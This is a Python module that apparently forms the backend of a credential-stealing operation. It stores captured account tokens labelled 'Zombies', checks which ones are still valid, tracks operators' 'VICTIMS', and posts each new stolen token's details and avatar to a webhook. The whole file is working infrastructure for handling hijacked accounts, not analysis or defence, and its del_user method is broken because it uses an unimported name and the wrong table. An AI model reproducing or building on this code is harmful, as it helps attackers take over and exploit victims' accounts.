from Checker import Checker
from tinydb import TinyDB
from Toats import Toast
import json


class Cache():
    def __init__(self, user_database_path, database_path, hook):
        self.user_database_path = user_database_path
        self.database_path = database_path
        self.user_database = TinyDB(user_database_path)
        self.database = TinyDB(database_path)
        self.Toats = Toast(hook)
        self.Zombies = []
        self.hook = hook
        self.all  = []

    def get_all_zombies(self):
        string = ""

        for zombie in self.all:
            string += f'{zombie}\n'
        
        return string

    def load_tokens(self):
        with open(self.database_path, 'r+') as database:
            db = json.load(database)

            for Zombie in db['Zombies']:
                self.Zombies.append((db['Zombies'][Zombie]['Token'])[:20])
            
            self.Zombies = list(set(self.Zombies))

    def check_zombies(self):
        self.Zombies.clear()
        self.all.clear()
        checked = []
        tokens  = []

        with open('./Data/Zombies.json', 'r+') as database:
            db = json.load(database)

            for Zombie in db['Zombies']:
                token = db['Zombies'][Zombie]['Token']
                token_info = Checker(token).get_informations()

                if token not in tokens and token_info != 'invalid':
                    self.Zombies.append(token[:20])
                    checked.append(token_info)
                    self.all.append(token)
                
                tokens.append(token)

        self.database.drop_table('Zombies')
        TinyDB.table(self.database, 'Zombies')

        if self.database.table('Zombies') != None:
            for zombie in checked:
                self.database.table('Zombies').insert(zombie)

    def add_zombie(self, token):
        if self.database.table('Zombies') != None:
            token_info = Checker(token).get_informations()

            if token[:20] not in self.Zombies and token_info != 'invalid':
                self.database.table('Zombies').insert(token_info)
                self.Zombies.append(token[:20])
                self.Toats.post(token_info, token_info['Avatar'])

    def send_report(self):
        hook = Toast(self.hook)
        
        fields = {
            "👽 | Zombies in database": str(len(self.Zombies))
        }

        hook.post(fields)

    def add_user(self, key, tag, usr_id):
        TinyDB.table(self.user_database, 'ACCOUNTS')

        if self.user_database.table('ACCOUNTS') != None:
            self.user_database.table('ACCOUNTS').insert({"KEY": key, "USERNAME": tag, "ID": str(usr_id), "VICTIMS": [  ], "PERMISSIONS": [ ] })

    def del_user(self, usr_id):
        TinyDB.table(self.user_database, 'Zombies')
        
        if self.user_database.table('ACCOUNTS') != None:
            self.user_database.table('ACCOUNTS').remove(where('ID') == usr_id)